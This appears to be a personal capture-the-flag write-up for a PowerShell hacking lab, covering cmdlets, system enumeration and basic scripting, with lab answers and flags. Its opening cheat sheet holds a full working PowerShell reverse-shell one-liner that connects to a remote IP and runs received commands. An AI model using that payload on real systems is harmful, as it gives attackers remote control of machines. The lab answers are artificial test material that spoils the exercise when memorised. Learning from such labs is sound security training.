# THM: Hacking with Powershell Writeup
> Andrew Eng | 2020-12-23

## Cheat Sheets
** Powershell WGET **

`wget http://blog.stackexchange.com/ -OutFile out.html`

**Powershell Reverse Shell**

> powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.9.26.195',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


## 1/6 Objectives
Q1. Deploy the machine

## 2/6 What is PowerShell
Introduction to Powershell; concepts on Verb-Noun cmdlet usage (i.e. Get, Start, Stop, read, Write, New, Out).  

**Additional Read:** 
[Microsoft Approved Verbs](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7)

Q1. What is the command to get help about a particular cmdlet(without any parameters)?
`Get-Help`

## 3/6 Basic Powershell Commands
**Q1.** What is the location of the file "interesting-file.txt"

Notes: There has got ot be a better way thing brute forcing files for strings.

`PS> Get-ChildItem C:\ -recurse | findstr interesting-file.txt`
> Answer: C:\Program Files

**Q2.** Specify the contents of this file

`PS> type "C:\Program Files\interesting-file.txt.txt"`
> Answer: notsointerestingcontent

**Q3.** How many cmdlets are installed on the system(only cmdlets, not functions and aliases)?

Notes: initially ran get-command, then I started to filter out the columns and pipe it to measure-object

`PS> Get-Command | Where-Object -Property CommandType -eq cmdlet | Measure-Object` 
> Answer: 6638

**Q4.** Get the MD5 hash of interesting-file.txt

Notes: help hash followed by help Get-FileHash to give me to arguments I need for setting Algorithm to MD5

`PS> Get-FileHash -Algorithm MD5 "C:\Program Files\interest-file.txt.txt"`
> Answer: 49A586A2A9456226F8A1B4CEC6FAB329

**Q5.** What is the command to get the current working directory?

> Answer: Get-Location

**Q6.** Does the path "C:\Users\Administrator\Documents\Passwords" Exist(Y/N)?

Notes: I didn't do this one in powershell....  Need to go back and look for how to do it in pwsh

> Answer: N

**Q7.** What command would you use to make a request to a web server?

Notes: help web

> Answer: Invoke-WebRequest

**Q8.** Base64 decode the file b64.txt on Windows.

Notes: I originally had an easier way to do this, but I can't seem to remember how.  So I'm doing this in a different way:

`PS> $content = [IO.File]::ReadAllText("Desktop\b64.txt")`
> Answer: ihopeyoudidthisonwindows

## 4/6 Enumeration
This section focuses on enumeration.  Single commandline syntax that pulls information.  The following are enumerated:
- users
- basic networking information
- file permissions
- registry permissions
- scheduled and running tasks
- insecure files

**Q1.** How many users are there on the machine

Notes: I used help user to find the cmdlet

`PS> Get-LocalUser`
> Answer: 5

**Q2.** Which local user does this SID(S-1-5-21-1394777289-3961777894-1791813945-501) belong to?

`PS> Get-LocalUser | Select-Object -Property Name,SID | findstr 501`
> Answer: Guest

**Q3.** How many users have their password required values set to False?

Notes:

`PS>`
> Answer: 4

**Q4.** How man local groups exist?

Notes: help groups

`Get-Localgroup`
> Answer: 24

**Q5.** What command did you use to get the IP address info?

> Answer: Get-NetIPAddress

**Q6.** How many ports are listed as listening?

Notes:

`PS>`
> Answer: 20

**Q7.** What is the remote address of the local port litsening on port 445?

Notes:

`PS>`
> Answer: ::

**Q8.** How many patches have been applied?

Notes:

`PS>`
> Answer: 20

**Q9.** When was the patch with ID KB4023834 installed?

Notes:

`PS>`
> Answer: 6/15/2017 12:00:00 AM

**Q10.** Find the contents of a backup file

Notes: It turns out bak is the extension, but it's in the middle of the file name.  I kept looking for a file extension vice just any pattern with "bak"

`PS> Get-ChildItem -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue`
`PS> Get-Content "C:\Program Files (x86)\Internet Explorer\passwords.bak.txt"`
> Answer: backpassflag

**Q11.** Search for all files containing API_KEY

Notes: I ran the correct ocmmand, but it's taking way too long

`PS> Get-ChildItem C:\* -Recurse | Select-String -pattern API_KEY`
> Answer: fakekey123

**Q12.** What command do you do to list all the running processes?

Notes:

`PS>`
> Answer: Get-Process

**Q13.** What is the path of the scheduled task called new-sched-task?

Notes:

`PS>`
> Answer /

**Q14.** Who is the owner of the C:\

Notes: It took a little bit, but easier than I thought.  I originally tried get-disk, but it displays specific hardware information.  

`PS> get-acl`
> Answer: NT SERVICE\TrustedInstaller

## 5/6: basic Scripting Challenge
Now we get into scripting.  

Additional reading: [Learn X in Y minutes](https://learnxinyminutes.com/docs/powershell/)

`$system_ports = Get-NetTCPConnection -State Listen

$text_port = Get-Content -Path C:\Users\Administrator\Desktop\ports.txt

foreach($port in $text_port){

    if($port -in $system_ports.LocalPort){

            echo $port

                 
    }

    
}`

**I answered the questions with the one-liner.  Defeating the purpose of this exercise.  I'm going to stop here for today and work on powershell scripting the answers**

**Q1.** What file contains the password?

Notes:

`PS> Get-ChildItem "C:\Users\Administrator\Desktop\emails" -recurse | select-String -pattern password`
> Answer: Doc3M.txt

**Q2.** What is the password?

Notes:

`PS> Get-ChildItem "C:\Users\Administrator\Desktop\emails" -recurse | select-String -pattern password`
> Answer: johnisalegend99

**Q3.** What files contains an HTTPS link?

Notes:

`PS> Get-ChildItem "C:\Users\Administrator\Desktop\emails" -recurse | select-String -pattern https`
> Answer: Doc2Mary

## 6/6: Intermediate Scripting

**Q1.** How many open ports did you find between 130 and 140 (inclusive of those two)?

Notes:

`PS>`
> Answer:

## Conclusion & Parting Thoughts

